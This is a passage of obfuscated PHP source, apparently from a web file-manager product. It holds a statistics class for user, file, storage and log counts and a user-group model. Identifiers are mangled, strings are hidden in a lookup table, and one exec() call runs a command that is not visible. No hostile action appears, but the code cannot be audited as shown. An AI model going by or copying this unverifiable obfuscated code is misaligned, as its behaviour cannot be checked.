$ÍŠî½…[$¯‹‡¢€¢[231]] = array($¯‹‡¢€¢[408], array($ÂÉş“«‡, $İ¢¦Ù¥£)); $Ë»È´— = Model($¯‹‡¢€¢[617])->where($ÍŠî½…)->count($¯‹‡¢€¢[1589]); $ÍŠî½…[$¯‹‡¢€¢[33]] = $¯‹‡¢€¢[2125]; $Ò“””Øß = Model($¯‹‡¢€¢[2126])->where($ÍŠî½…)->count($¯‹‡¢€¢[2127]); $¿‚¼­É´ = array($¯‹‡¢€¢[282] => $’‡Ì³»¤, $¯‹‡¢€¢[875] => (int) $ğÔ ´Îæ, $¯‹‡¢€¢[2112] => (int) $Ë»È´—, $¯‹‡¢€¢[2113] => (int) $Ò“””Øß); return $this->insert($¿‚¼­É´); } public function _recordStore($âÕÆĞæ¯ = '') { $åĞ£èÌ‰ =& $_SERVER[œ—üé‹ê]; $îÍú÷Ëµ = strtotime(date($åĞ£èÌ‰[2124], strtotime($âÕÆĞæ¯))); $”¡§²– = array($åĞ£èÌ‰[231] => array($åĞ£èÌ‰[1180], $îÍú÷Ëµ)); $¹Á‹ÜË = Model($åĞ£èÌ‰[560])->where($”¡§²–)->sum($åĞ£èÌ‰[79]); $”¡§²–[$åĞ£èÌ‰[500]] = 0; $ñšĞ°Ğ = Model($åĞ£èÌ‰[942])->where($”¡§²–)->sum($åĞ£èÌ‰[79]); $”¡§²–[$åĞ£èÌ‰[188]] = 1; $‡¶‡é¨¨ = Model($åĞ£èÌ‰[942])->where($”¡§²–)->sum($åĞ£èÌ‰[79]); $”¡§²–[$åĞ£èÌ‰[188]] = 2; $½®­å» = Model($åĞ£èÌ‰[942])->where($”¡§²–)->sum($åĞ£èÌ‰[79]); $³Ğ†É½ = array($åĞ£èÌ‰[282] => $âÕÆĞæ¯, $åĞ£èÌ‰[873] => (int) $ñšĞ°Ğ, $åĞ£èÌ‰[2116] => (int) $¹Á‹ÜË, $åĞ£èÌ‰[2117] => (int) $‡¶‡é¨¨, $åĞ£èÌ‰[2118] => (int) $½®­å»); return $this->insert($³Ğ†É½); } public function trend($‹¿ùà¨¸, $·™ó”¡£) { $êÉâĞÔÀ =& $_SERVER[œ—üé‹ê]; if (!$this->init($‹¿ùà¨¸)) { return !1; } $®¾¾ç¶Ñ = $this->trendList($‹¿ùà¨¸); if ($®¾¾ç¶Ñ && $·™ó”¡£ != $êÉâĞÔÀ[1947]) { $¥øØ´‰º = $®¾¾ç¶Ñ[0][$êÉâĞÔÀ[282]]; $ÑÀ¢ï‹– = $this->validDate($·™ó”¡£, $¥øØ´‰º); $Ôûûéœû = array(); $ñß†äßô = array_to_keyvalue($®¾¾ç¶Ñ, $êÉâĞÔÀ[282]); foreach ($ÑÀ¢ï‹– as $ÚÕĞÙåÏ) { if (isset($ñß†äßô[$ÚÕĞÙåÏ])) { $Ù”Ö¦†— = $ñß†äßô[$ÚÕĞÙåÏ]; } else { $Ù”Ö¦†— = end($®¾¾ç¶Ñ); $Ù”Ö¦†—[$êÉâĞÔÀ[282]] = $ÚÕĞÙåÏ; if ($‹¿ùà¨¸ == $êÉâĞÔÀ[684]) { $Ù”Ö¦†—[$êÉâĞÔÀ[2112]] = $Ù”Ö¦†—[$êÉâĞÔÀ[2113]] = 0; } } $Ôûûéœû[] = $Ù”Ö¦†—; } $®¾¾ç¶Ñ = $Ôûûéœû; } $®Ó±Š¥÷ = array($êÉâĞÔÀ[684] => array($êÉâĞÔÀ[875] => LNG($êÉâĞÔÀ[2128]), $êÉâĞÔÀ[2112] => LNG($êÉâĞÔÀ[2129]), $êÉâĞÔÀ[2113] => LNG($êÉâĞÔÀ[2130])), $êÉâĞÔÀ[2114] => array($êÉâĞÔÀ[873] => LNG($êÉâĞÔÀ[2131]), $êÉâĞÔÀ[2116] => LNG($êÉâĞÔÀ[2132]), $êÉâĞÔÀ[2117] => LNG($êÉâĞÔÀ[2133]), $êÉâĞÔÀ[2118] => LNG($êÉâĞÔÀ[2134]))); $À‡øğş = array($êÉâĞÔÀ[684] => $êÉâĞÔÀ[959], $êÉâĞÔÀ[2114] => $êÉâĞÔÀ[79]); if (empty($®¾¾ç¶Ñ)) { $ÚÕĞÙåÏ = date($êÉâĞÔÀ[2119], strtotime($êÉâĞÔÀ[2120])); $Î´—û˜š = array($êÉâĞÔÀ[282] => $ÚÕĞÙåÏ); foreach ($®Ó±Š¥÷[$‹¿ùà¨¸] as $ö¢«å‡ => $ŒùáÔ‚´) { $Î´—û˜š[$ö¢«å‡] = 0; } $®¾¾ç¶Ñ[] = $Î´—û˜š; } $ìç±ÉÂ = array(); foreach ($®¾¾ç¶Ñ as $ŒùáÔ‚´) { if ($‹¿ùà¨¸ == $êÉâĞÔÀ[2114] && $ŒùáÔ‚´[$êÉâĞÔÀ[2116]] > $ŒùáÔ‚´[$êÉâĞÔÀ[873]]) { $ŒùáÔ‚´[$êÉâĞÔÀ[2116]] = $ŒùáÔ‚´[$êÉâĞÔÀ[873]]; } foreach ($®Ó±Š¥÷[$‹¿ùà¨¸] as $ö¢«å‡ => $Æ’ÔêĞ´) { $Ù”Ö¦†— = array($êÉâĞÔÀ[282] => $ŒùáÔ‚´[$êÉâĞÔÀ[282]], $êÉâĞÔÀ[1861] => $Æ’ÔêĞ´); $Ù”Ö¦†—[$À‡øğş[$‹¿ùà¨¸]] = isset($ŒùáÔ‚´[$ö¢«å‡]) ? $ŒùáÔ‚´[$ö¢«å‡] : 0; $ìç±ÉÂ[] = $Ù”Ö¦†—; } } return $ìç±ÉÂ; } public function validDate($õæ·à¼®, $ç¦‹éËğ) { $¨“Õ²‚µ =& $_SERVER[œ—üé‹ê]; $Ú–ª¸Ìä = date($¨“Õ²‚µ[2119], strtotime($¨“Õ²‚µ[2120])); $İ·´³±Ò = array($Ú–ª¸Ìä); switch ($õæ·à¼®) { case $¨“Õ²‚µ[1954]: $Š½“’˜ı = mktime(0, 0, 0, date($¨“Õ²‚µ[2135]), date($¨“Õ²‚µ[1656]) - date($¨“Õ²‚µ[1742]) + 7 - 7, date($¨“Õ²‚µ[2136])); $òŒº¯Ù“ = 0; do { $ĞĞî¨¿ = date($¨“Õ²‚µ[2119], $Š½“’˜ı - 3600 * 24 * 7 * $òŒº¯Ù“); $İ·´³±Ò[] = $ĞĞî¨¿; $òŒº¯Ù“++; } while ($ç¦‹éËğ < $ĞĞî¨¿); break; case $¨“Õ²‚µ[1952]: $òŒº¯Ù“ = 1; do { $ÜØ˜şÊÃ = date($¨“Õ²‚µ[2137], strtotime("\x2d\x20{$òŒº¯Ù“}\x20\155\x6f\x6e\164\x68\163")); $İ·´³±Ò[] = $ÜØ˜şÊÃ; $òŒº¯Ù“++; } while ($ç¦‹éËğ < $ÜØ˜şÊÃ); break; case $¨“Õ²‚µ[2138]: $Ÿ»ÖÅ¹š = (int) date($¨“Õ²‚µ[2136], strtotime($ç¦‹éËğ)); $¹ÖâéŠ = (int) date($¨“Õ²‚µ[2136]); if ($Ÿ»ÖÅ¹š >= $¹ÖâéŠ) { break; } for ($Ÿ»ÖÅ¹š; $Ÿ»ÖÅ¹š < $¹ÖâéŠ; $Ÿ»ÖÅ¹š++) { $İ·´³±Ò[] = $Ÿ»ÖÅ¹š . $¨“Õ²‚µ[2139]; } break; default: break; } if ($ç¦‹éËğ > end($İ·´³±Ò)) { array_pop($İ·´³±Ò); } sort($İ·´³±Ò); return $İ·´³±Ò; } public function listTable($¤‰·ÈÍ²) { $œã İî¨ = ucfirst($¤‰·ÈÍ²); return Model($œã İî¨)->listData(); } public function option($ŸôÇ„²) { return call_user_func_array(array($this, $_SERVER[œ—üé‹ê][2140] . ucfirst($ŸôÇ„²)), array()); } private function optionUser() { $íü¨Ğéî =& $_SERVER[œ—üé‹ê]; $‡à¨¨Š« = Model($íü¨Ğéî[617])->count($íü¨Ğéî[1589]); $Ïø¸§çä = Model($íü¨Ğéî[617])->where($íü¨Ğéî[2141])->count($íü¨Ğéî[1589]); $‘–—ÃÒÄ = intval($GLOBALS[$íü¨Ğéî[6]][$íü¨Ğéî[424]][$íü¨Ğéî[1921]]) / 3600; $§Øà û = strtotime("\55{$‘–—ÃÒÄ}\40\x68\x6f\165\162\163"); $´—Ÿ³úÔ = strtotime(date($íü¨Ğéî[2123])); if ($§Øà û < $´—Ÿ³úÔ) { $§Øà û = $´—Ÿ³úÔ; } $æËÎ¹í = array($íü¨Ğéî[2142] => array($íü¨Ğéî[1181], $§Øà û)); $Ãô¿ÀÆ = (int) Model($íü¨Ğéî[617])->where($æËÎ¹í)->count($íü¨Ğéî[1589]); if (!$Ãô¿ÀÆ) { $Ãô¿ÀÆ = 1; } $æËÎ¹í = array($íü¨Ğéî[2142] => array($íü¨Ğéî[1181], $´—Ÿ³úÔ)); $´‚Í’ö­ = Model($íü¨Ğéî[617])->where($æËÎ¹í)->count($íü¨Ğéî[1589]); return array($íü¨Ğéî[868] => (int) $‡à¨¨Š«, $íü¨Ğéî[2143] => (int) ($‡à¨¨Š« - $Ïø¸§çä), $íü¨Ğéî[2144] => (int) $Ïø¸§çä, $íü¨Ğéî[2145] => (int) $´‚Í’ö­, $íü¨Ğéî[2146] => $Ãô¿ÀÆ); } private function optionFile() { $‹£±¸êı =& $_SERVER[œ—üé‹ê]; $Ôè¾°’ = $this->sourceSize(); $§‘éï«Ê = $Ôè¾°’[$‹£±¸êı[79]]; $™Ÿ‡š›’ = $Ôè¾°’[$‹£±¸êı[2116]]; $—«ùÏ© = Model($‹£±¸êı[942])->where(array($‹£±¸êı[500] => 0))->count($‹£±¸êı[191]); $ÌÌî°Õ = array($‹£±¸êı[500] => 0, $‹£±¸êı[231] => array($‹£±¸êı[1181], strtotime(date($‹£±¸êı[2123])))); $Ï»¦‹ô› = Model($‹£±¸êı[942])->where($ÌÌî°Õ)->sum($‹£±¸êı[79]); $¥°Ïî’ = Model($‹£±¸êı[942])->where($ÌÌî°Õ)->count($‹£±¸êı[191]); return array($‹£±¸êı[873] => $§‘éï«Ê, $‹£±¸êı[2116] => $™Ÿ‡š›’, $‹£±¸êı[2147] => $§‘éï«Ê - $™Ÿ‡š›’, $‹£±¸êı[2148] => (int) $Ï»¦‹ô›, $‹£±¸êı[875] => (int) $—«ùÏ©, $‹£±¸êı[2149] => (int) $¥°Ïî’); } private function optionAccess() { $ ×ê§× =& $_SERVER[œ—üé‹ê]; return array($ ×ê§×[868] => $this->typeLogCnt(), $ ×ê§×[107] => $this->typeLogCnt($ ×ê§×[107]), $ ×ê§×[539] => $this->typeLogCnt($ ×ê§×[539]), $ ×ê§×[1330] => $this->typeLogCnt($ ×ê§×[1330]), $ ×ê§×[1558] => $this->typeLogCnt($ ×ê§×[1558]), $ ×ê§×[684] => $this->typeLogCnt($ ×ê§×[12], $ ×ê§×[2127])); } private function typeLogCnt($†éÄ•·½ = '', $Ì…€âå = "\x69\x64") { $µâà²²Ù =& $_SERVER[œ—üé‹ê]; $ò¬ş°ÔÎ = array($µâà²²Ù[107] => array($µâà²²Ù[2150], $µâà²²Ù[2151]), $µâà²²Ù[539] => array($µâà²²Ù[2152], $µâà²²Ù[2153]), $µâà²²Ù[1330] => array($µâà²²Ù[2154], $µâà²²Ù[2155], $µâà²²Ù[2156]), $µâà²²Ù[1558] => array($µâà²²Ù[2157], $µâà²²Ù[2158]), $µâà²²Ù[1559] => array($µâà²²Ù[2159], $µâà²²Ù[2160], $µâà²²Ù[2161])); $½ŞÀÓñŠ = strtotime(date($µâà²²Ù[2123])); $ù Ü›êÅ = array($µâà²²Ù[231] => array($µâà²²Ù[1181], $½ŞÀÓñŠ)); if ($†éÄ•·½) { $ù Ü›êÅ[$µâà²²Ù[33]] = array($µâà²²Ù[7], $ò¬ş°ÔÎ[$†éÄ•·½]); } $­‹êÎ° = Model($µâà²²Ù[2126])->where($ù Ü›êÅ)->count($Ì…€âå); return (int) $­‹êÎ°; } private function optionServer() { $Á¡­ÊÂÊ =& $_SERVER[œ—üé‹ê]; $ë€ñÀ“Ø = $this->diskDriver(); $…™¦Áüˆ = KodIO::defaultDriver(); $¢•¦¨£ = array($Á¡­ÊÂÊ[935] => $…™¦Áüˆ[$Á¡­ÊÂÊ[487]]); $¸±„©ˆª = Model($Á¡­ÊÂÊ[560])->where($¢•¦¨£)->sum($Á¡­ÊÂÊ[79]); $‰Ğ¢ÙÃ = explode($Á¡­ÊÂÊ[53], $_SERVER[$Á¡­ÊÂÊ[144]]); $Ğ…†¿Ù = $‰Ğ¢ÙÃ[0]; $ƒ¹ÍÓ²µ = $GLOBALS[$Á¡­ÊÂÊ[6]][$Á¡­ÊÂÊ[21]]; $Ü¸Åõâ = $ƒ¹ÍÓ²µ[$Á¡­ÊÂÊ[1143]]; if ($Ü¸Åõâ == $Á¡­ÊÂÊ[1131]) { $Å†ñ¥Ü = explode($Á¡­ÊÂÊ[1469], $ƒ¹ÍÓ²µ[$Á¡­ÊÂÊ[1142]]); $Ü¸Åõâ = $Å†ñ¥Ü[0]; } if ($Ü¸Åõâ == $Á¡­ÊÂÊ[1079] || $Ü¸Åõâ == $Á¡­ÊÂÊ[910]) { $¶ĞÌ€õÊ = Model()->db()->query($Á¡­ÊÂÊ[2162]); $´íÎï¡Æ = $¶ĞÌ€õÊ[0] && isset($¶ĞÌ€õÊ[0][$Á¡­ÊÂÊ[1860]]) ? $¶ĞÌ€õÊ[0][$Á¡­ÊÂÊ[1860]] : 0; $Ü¸Åõâ = $Á¡­ÊÂÊ[2163] . ($´íÎï¡Æ ? $Á¡­ÊÂÊ[8] . $´íÎï¡Æ : $Á¡­ÊÂÊ[12]); } $Ô¢ïĞ¾ = $GLOBALS[$Á¡­ÊÂÊ[6]][$Á¡­ÊÂÊ[424]][$Á¡­ÊÂÊ[988]]; return array($Á¡­ÊÂÊ[2164] => $ë€ñÀ“Ø ? $ë€ñÀ“Ø[$Á¡­ÊÂÊ[2165]] : 0, $Á¡­ÊÂÊ[2166] => $ë€ñÀ“Ø ? $ë€ñÀ“Ø[$Á¡­ÊÂÊ[2167]] : 0, $Á¡­ÊÂÊ[2168] => (int) $…™¦Áüˆ[$Á¡­ÊÂÊ[2165]] * 1024 * 1024 * 1024, $Á¡­ÊÂÊ[2169] => (int) $¸±„©ˆª, $Á¡­ÊÂÊ[2170] => ucfirst($Ğ…†¿Ù), $Á¡­ÊÂÊ[2171] => $Á¡­ÊÂÊ[2172] . PHP_VERSION, $Á¡­ÊÂÊ[2173] => phpBuild64() ? 64 : 32, $Á¡­ÊÂÊ[867] => str_replace($Á¡­ÊÂÊ[1304], $Á¡­ÊÂÊ[1159], $Ü¸Åõâ), $Á¡­ÊÂÊ[424] => ucfirst($Ô¢ïĞ¾), $Á¡­ÊÂÊ[32] => $_SERVER[$Á¡­ÊÂÊ[2174]]); } private function diskDriver() { $–‡î¶Ñ¨ =& $_SERVER[œ—üé‹ê]; $ÛÏÇÁ×Å = $–‡î¶Ñ¨[8]; $ƒ„À‡¿ë = $GLOBALS[$–‡î¶Ñ¨[6]][$–‡î¶Ñ¨[1493]] == $–‡î¶Ñ¨[1494]; if ($ƒ„À‡¿ë) { $ÛÏÇÁ×Å = $–‡î¶Ñ¨[2175]; if (function_exists($–‡î¶Ñ¨[2176])) { exec($–‡î¶Ñ¨[2177], $ğĞª”óè); $ÛÏÇÁ×Å = $ğĞª”óè[1] . $–‡î¶Ñ¨[8]; } } if (!file_exists($ÛÏÇÁ×Å)) { return; } if (!function_exists($–‡î¶Ñ¨[2178])) { return; } $¢ğÖÊÃæ = @disk_total_space($ÛÏÇÁ×Å); $Ÿóâšæï = $¢ğÖÊÃæ - @disk_free_space($ÛÏÇÁ×Å); return array($–‡î¶Ñ¨[2165] => $¢ğÖÊÃæ, $–‡î¶Ñ¨[2167] => $Ÿóâšæï); } public function fileChart($°¸ƒ“¶á) { $ü¸²ÆÅ€ =& $_SERVER[œ—üé‹ê]; if (isset($°¸ƒ“¶á[$ü¸²ÆÅ€[1589]])) { return Model($ü¸²ÆÅ€[942])->userFileTypeProfile($°¸ƒ“¶á[$ü¸²ÆÅ€[1589]]); } if (isset($°¸ƒ“¶á[$ü¸²ÆÅ€[1491]])) { return Model($ü¸²ÆÅ€[942])->groupFileTypeProfile($°¸ƒ“¶á[$ü¸²ÆÅ€[1491]]); } $×ÅÁ³ïå = $this->sourceSize(); $¹Ïíœ¦‘ = array($ü¸²ÆÅ€[190] => 0, $ü¸²ÆÅ€[188] => 1); $òéè°‰« = Model($ü¸²ÆÅ€[942])->where($¹Ïíœ¦‘)->sum($ü¸²ÆÅ€[79]); $¹Ïíœ¦‘[$ü¸²ÆÅ€[188]] = 2; $ Š…ê¯ = Model($ü¸²ÆÅ€[942])->where($¹Ïíœ¦‘)->sum($ü¸²ÆÅ€[79]); return array($ü¸²ÆÅ€[873] => $×ÅÁ³ïå[$ü¸²ÆÅ€[79]], $ü¸²ÆÅ€[2116] => $×ÅÁ³ïå[$ü¸²ÆÅ€[2116]], $ü¸²ÆÅ€[2117] => (int) $òéè°‰«, $ü¸²ÆÅ€[2118] => (int) $ Š…ê¯); } private function sourceSize() { $ş›‚  =& $_SERVER[œ—üé‹ê]; $˜›€ĞáÂ = Model($ş›‚ [942])->where(array($ş›‚ [500] => 0))->sum($ş›‚ [79]); $÷ÍçĞ¿ = Model($ş›‚ [560])->sum($ş›‚ [79]); if ($÷ÍçĞ¿ > $˜›€ĞáÂ) { $÷ÍçĞ¿ = $˜›€ĞáÂ; } return array($ş›‚ [79] => (int) $˜›€ĞáÂ, $ş›‚ [2116] => (int) $÷ÍçĞ¿); } } goto Eœ£®¨†ôæ; dò÷ùé¸ó³: class GroupModel extends ModelBase { protected $tableName = "\147\162\157\x75\160"; protected $tableMeta = array("\164\x61\142\154\145\116\x61\155\145" => "\x67\x72\x6f\165\160\x5f\155\145\164\141", "\155\145\x74\141\106\151\145\154\x64" => "\x67\x72\157\165\x70\x49\104"); protected function cacheFunctionAlias($ˆÀ±»™Å) { $ÌäÜùòö =& $_SERVER[œ—üé‹ê]; return array($ÌäÜùòö[2259] => array($ˆÀ±»™Å[0], $ÌäÜùòö[2260]), $ÌäÜùòö[2261] => array($ˆÀ±»™Å[0], $ÌäÜùòö[2262])); } protected function ___getInfo($œŞÈ¬ÉÉ) { $ıÌê’Ğ = $this->getInfoSimple($œŞÈ¬ÉÉ); if (!$ıÌê’Ğ) { return !1; } return $this->_listDataApplyItem($ıÌê’Ğ); } protected function ___getInfoSimple($É™ø°±) { $’õë«Œ = array($_SERVER[œ—üé‹ê][1491] => intval($É™ø°±)); $·şö’Şæ = $this->where($’õë«Œ)->find(); return is_array($·şö’Şæ) ? $·şö’Şæ : array(); } protected function groupAdd($Ì×Ô’õ‘) { $ˆõæ „ =& $_SERVER[œ—üé‹ê]; if (!$Ì×Ô’õ‘[$ˆõæ „[190]] && isset($Ì×Ô’õ‘[$ˆõæ „[1491]]) && $Ì×Ô’õ‘[$ˆõæ „[1491]] == 1) { if ($ĞÓÎ»êã = $this->getInfoSimple($Ì×Ô’õ‘[$ˆõæ „[1491]], !0)) { return $Ì×Ô’õ‘[$ˆõæ „[1491]]; } } else { $ĞÓÎ»êã = $this->getInfoSimple($Ì×Ô’õ‘[$ˆõæ „[190]]); if (!$ĞÓÎ»êã) { return !1; } } $ÑÃÒ¸ÑÆ = $ˆõæ „[613]; if ($ĞÓÎ»êã[$ˆõæ „[604]]) { $ÑÃÒ¸ÑÆ = $ĞÓÎ»êã[$ˆõæ „[604]] . $ĞÓÎ»êã[$ˆõæ „[1491]] . $ˆõæ „[50]; } $Æ‰¬òÒí = array($ˆõæ „[509] => $this->groupNameAuto($Ì×Ô’õ‘[$ˆõæ „[190]], $Ì×Ô’õ‘[$ˆõæ „[32]]), $ˆõæ „[492] => $Ì×Ô’õ‘[$ˆõæ „[190]], $ˆõæ „[674] => $ÑÃÒ¸ÑÆ, $ˆõæ „[2263] => $Ì×Ô’õ‘[$ˆõæ „[2165]], $ˆõæ „[2264] => 0, $ˆõæ „[2182] => 0); $Ì×Ô’õ‘[$ˆõæ „[32]] = $Æ‰¬òÒí[$ˆõæ „[32]]; if (isset($Ì×Ô’õ‘[$ˆõæ „[2200]])) { $Æ‰¬òÒí[$ˆõæ „[2200]] = $Ì×Ô’õ‘[$ˆõæ „[2200]]; } else { $öØÌÃÉÕ = $this->max($ˆõæ „[2200]); if (!$öØÌÃÉÕ) { $öØÌÃÉÕ = 0; } $Æ‰¬òÒí[$ˆõæ „[2200]] = $öØÌÃÉÕ + 1; } if (!empty($Ì×Ô’õ‘[$ˆõæ „[1491]])) { $Æ‰¬òÒí[$ˆõæ „[1491]] = $Ì×Ô’õ‘[$ˆõæ „[1491]]; } $ÓÅ˜¼ªÁ = $this->add($Æ‰¬òÒí); $this->groupMetaEdit($ÓÅ˜¼ªÁ, $Ì×Ô’õ‘); Model($ˆõæ „[1530])->groupRootAdd($ÓÅ˜¼ªÁ); $this->_clearCache($Ì×Ô’õ‘[$ˆõæ „[190]]); return $ÓÅ˜¼ªÁ; } protected function groupEdit($”ö‡éÚ², $£óÅÔ³Ë) { $ÓñÉÁ¯Û =& $_SERVER[œ—üé‹ê]; $“Ê´‹í = $this->getInfoSimple($”ö‡éÚ²); if (!$“Ê´‹í) { return !1; } if (!empty($£óÅÔ³Ë[$ÓñÉÁ¯Û[190]])) { $û±ùÅ€¿ = $this->getInfoSimple($£óÅÔ³Ë[$ÓñÉÁ¯Û[190]]); if (!$û±ùÅ€¿) { return !1; } if ($“Ê´‹í[$ÓñÉÁ¯Û[1491]] == $û±ùÅ€¿[$ÓñÉÁ¯Û[1491]]) { return !1; } if ($£óÅÔ³Ë[$ÓñÉÁ¯Û[190]] != $“Ê´‹í[$ÓñÉÁ¯Û[190]]) { if ($û±ùÅ€¿[$ÓñÉÁ¯Û[604]] !== $“Ê´‹í[$ÓñÉÁ¯Û[604]] && strpos($û±ùÅ€¿[$ÓñÉÁ¯Û[604]], $“Ê´‹í[$ÓñÉÁ¯Û[604]] . $“Ê´‹í[$ÓñÉÁ¯Û[1491]] . $ÓñÉÁ¯Û[50]) === 0) { return !1; } $£óÅÔ³Ë[$ÓñÉÁ¯Û[674]] = $û±ùÅ€¿[$ÓñÉÁ¯Û[604]] . $£óÅÔ³Ë[$ÓñÉÁ¯Û[190]] . $ÓñÉÁ¯Û[50]; $this->_changeChildLevel($“Ê´‹í, $û±ùÅ€¿); $this->_clearCache($û±ùÅ€¿[$ÓñÉÁ¯Û[1491]]); $this->_clearCache($“Ê´‹í[$ÓñÉÁ¯Û[190]]); } } $this->groupMetaEdit($”ö‡éÚ², $£óÅÔ³Ë); $this->_clearChildrenCache($“Ê´‹í); return $this->where(array($ÓñÉÁ¯Û[2265] => $”ö‡éÚ²))->save($£óÅÔ³Ë); } private function groupMetaEdit($Ô†Å‹©Ó, &$¾ù¬ŸÌ) { $™üê³¨ =& $_SERVER[œ—üé‹ê]; if (isset($¾ù¬ŸÌ[$™üê³¨[32]])) { $this->setNamePinyin($Ô†Å‹©Ó, $¾ù¬ŸÌ[$™üê³¨[32]]); } if (isset($¾ù¬ŸÌ[$™üê³¨[2266]])) { $“™õ™‰ğ = array($™üê³¨[2266] => $¾ù¬ŸÌ[$™üê³¨[2266]], $™üê³¨[2267] => $¾ù¬ŸÌ[$™üê³¨[2267]]); unset($¾ù¬ŸÌ[$™üê³¨[2266]]); unset($¾ù¬ŸÌ[$™üê³¨[2267]]); if (isset($¾ù¬ŸÌ[$™üê³¨[2268]])) { $»¾øëŒ = $™üê³¨[1487] . $Ô†Å‹©Ó; $™ßØëÒ— = $™üê³¨[1486]; $¤ˆèûÌ› = $¾ù¬ŸÌ[$™üê³¨[2268]] ? $¾ù¬ŸÌ[$™üê³¨[2268]] : $™üê³¨[12]; $©°¢·åÀ = Model($™üê³¨[1485])->get($»¾øëŒ, $™ßØëÒ—); $©°¢·åÀ = $©°¢·åÀ ? $©°¢·åÀ : $™üê³¨[12]; if ($©°¢·åÀ != $¤ˆèûÌ›) { if (!$¤ˆèûÌ› && $©°¢·åÀ) { Model($™üê³¨[1485])->remove($»¾øëŒ, $™ßØëÒ—); } else { if ($¤ˆèûÌ›) { Model($™üê³¨[1485])->set($»¾øëŒ, $¤ˆèûÌ›, $™ßØëÒ—); } } } $“™õ™‰ğ[$™üê³¨[2268]] = $¤ˆèûÌ›; } $this->metaSet($Ô†Å‹©Ó, $“™õ™‰ğ); } } private function _clearChildrenCache($ëäË©‰) { $Óš–èÎƒ =& $_SERVER[œ—üé‹ê]; $“–¨ô‘‰ = array($Óš–èÎƒ[674] => array($Óš–èÎƒ[635], $ëäË©‰[$Óš–èÎƒ[604]] . $ëäË©‰[$Óš–èÎƒ[1491]] . $Óš–èÎƒ[636])); $ó‡µÇÎ÷ = $this->field($Óš–èÎƒ[1491])->where($“–¨ô‘‰)->select(); foreach ($ó‡µÇÎ÷ as $ß´‘ËÒõ) { $this->_clearCache($ß´‘ËÒõ[$Óš–èÎƒ[1491]]); } } private function _clearCache($¦œíÒÚ) { $Œ»îŠ˜ =& $_SERVER[œ—üé‹ê]; $this->cacheFunctionClear($Œ»îŠ˜[2269], $¦œíÒÚ); $this->cacheFunctionClear($Œ»îŠ˜[2270], $¦œíÒÚ); } private function _changeChildLevel($…òãÌî, $”‡å¯“, $óûùË¹© = false) { $íÑÌµóÙ =& $_SERVER[œ—üé‹ê]; $ÌŒãõò€ = $…òãÌî[$íÑÌµóÙ[604]] . $…òãÌî[$íÑÌµóÙ[1491]] . $íÑÌµóÙ[50]; $æ»­Ì¶É = $”‡å¯“[$íÑÌµóÙ[604]] . $”‡å¯“[$íÑÌµóÙ[1491]] . $íÑÌµóÙ[50] . $…òãÌî[$íÑÌµóÙ[1491]] . $íÑÌµóÙ[50]; if ($óûùË¹©) { $æ»­Ì¶É = $”‡å¯“[$íÑÌµóÙ[604]] . $”‡å¯“[$íÑÌµóÙ[1491]] . $íÑÌµóÙ[50]; } $Èªå÷à = array($íÑÌµóÙ[674] => array($íÑÌµóÙ[635], $…òãÌî[$íÑÌµóÙ[604]] . $…òãÌî[$íÑÌµóÙ[1491]] . $íÑÌµóÙ[636])); $ªÚÏÂİá = array($íÑÌµóÙ[674] => array($íÑÌµóÙ[683], "\x72\x65\160\x6c\141\143\145\x28\x70\141\162\x65\x6e\x74\114\x65\x76\145\154\54\x27{$ÌŒãõò€}\47\54\x27{$æ»­Ì¶É}\x27\51")); $this->_clearChildrenCache($…òãÌî); $this->where($Èªå÷à)->data($ªÚÏÂİá)->save(); } public function setNamePinyin($¸ş¿‘Ï, $–®­×Í = false) { $äµâÍÇã =& $_SERVER[œ—üé‹ê]; if (!$–®­×Í) { $¼ùÊò²“ = $this->getInfoSimple($¸ş¿‘Ï); $–®­×Í = $¼ùÊò²“[$äµâÍÇã[32]]; } if (!Input::check($–®­×Í, $äµâÍÇã[677])) { $this->metaSet($¸ş¿‘Ï, $äµâÍÇã[552], null); $this->metaSet($¸ş¿‘Ï, $äµâÍÇã[551], null); return; } $Š’Ú®ï® = array($äµâÍÇã[552] => str_replace($äµâÍÇã[53], $äµâÍÇã[12], Pinyin::get($–®­×Í)), $äµâÍÇã[551] => Pinyin::get($–®­×Í, $äµâÍÇã[678])); $this->metaSet($¸ş¿‘Ï, $Š’Ú®ï®); } protected function metaSet($¶¼ıÜâ½, $ŒÊçé·’ = null, $î»¥Ø¶ = null) { $this->_clearCache($¶¼ıÜâ½); return parent::metaSet($¶¼ıÜâ½, $ŒÊçé·’, $î»¥Ø¶); } protected function groupStatus($÷µ×²ÛÜ, $îõß¢‰¤) { $üÓÜçÊ =& $_SERVER[œ—üé‹ê]; $®óè•œÍ = $this->getInfoSimple($÷µ×²ÛÜ); if (!$®óè•œÍ) { return !1; } $this->_clearCache($÷µ×²ÛÜ); return $this->metaSet($÷µ×²ÛÜ, $üÓÜçÊ[859], $îõß¢‰¤); if ($îõß¢‰¤ == $üÓÜçÊ[91]) { $ä°±’’³ = $this->parentLevelArray($®óè•œÍ[$üÓÜçÊ[604]]); } else { } $ä°±’’³[] = $®óè•œÍ[$üÓÜçÊ[1491]]; $Ö¬ÚœÁ¯ = array(); foreach ($ä°±’’³ as $÷µ×²ÛÜ) { $Ö¬ÚœÁ¯[] = array($üÓÜçÊ[1491] => $÷µ×²ÛÜ, $üÓÜçÊ[95] => $üÓÜçÊ[859], $üÓÜçÊ[451] => $îõß¢‰¤); $this->_clearCache($÷µ×²ÛÜ); } return Model($üÓÜçÊ[2271])->addAll($Ö¬ÚœÁ¯, array(), !0); } protected function groupRemove($ÈÙÕè¢É, $ÊÖØ³íò = false) { $ÌìØ =& $_SERVER[œ—üé‹ê]; $ÅæÒÈÎ = array($ÌìØ[1491] => $ÈÙÕè¢É); $ö êÏ¿ß = $this->where($ÅæÒÈÎ)->find(); if (!$ö êÏ¿ß || $ö êÏ¿ß[$ÌìØ[190]] == 0) { return !1; } if (!$ÊÖØ³íò) { $úô×ü’ç = $this->getInfoSimple($ö êÏ¿ß[$ÌìØ[190]]); $this->_changeChildLevel($ö êÏ¿ß, $úô×ü’ç, !0); $this->where(array($ÌìØ[190] => $ÈÙÕè¢É))->save(array($ÌìØ[190] => $ö êÏ¿ß[$ÌìØ[190]])); $this->_clearCache($úô×ü’ç[$ÌìØ[1491]]); } Model($ÌìØ[2271])->where($ÅæÒÈÎ)->delete(); Model($ÌìØ[2272])->where($ÅæÒÈÎ)->delete(); Model($ÌìØ[942])->groupRootRemove($ÈÙÕè¢É); $this->_clearCache($ö êÏ¿ß[$ÌìØ[190]]); return $this->where($ÅæÒÈÎ)->delete(); } protected function groupSort($Óø¬ëà) { $·ÂòÙ³ =& $_SERVER[œ—üé‹ê]; $åˆüÏõ¨ = array(); foreach ($Óø¬ëà 